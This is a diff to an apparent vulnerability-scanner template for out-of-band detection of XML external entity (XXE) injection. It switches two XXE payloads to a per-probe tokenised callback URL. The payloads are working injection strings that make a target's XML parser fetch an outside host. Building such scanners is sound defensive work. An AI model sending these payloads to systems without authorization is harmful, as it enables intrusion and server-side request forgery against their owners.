@@ -7,8 +7,10 @@ owasp: WSTG-INPV-07
 cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
 inject_into: [body, json]
 payloads:
-  - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{oast_domain}}/\">]><r>&x;</r>"
-  - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"http://{{oast_domain}}/\"> %x;]><r/>"
+  # {{oast_url}} carries a unique token in the path, so the entity fetch correlates to
+  # this exact probe (works with both Interactsh and the self-hosted collector).
+  - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"{{oast_url}}\">]><r>&x;</r>"
+  - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"{{oast_url}}\"> %x;]><r/>"
 oracle:
   type: any_of
   checks:
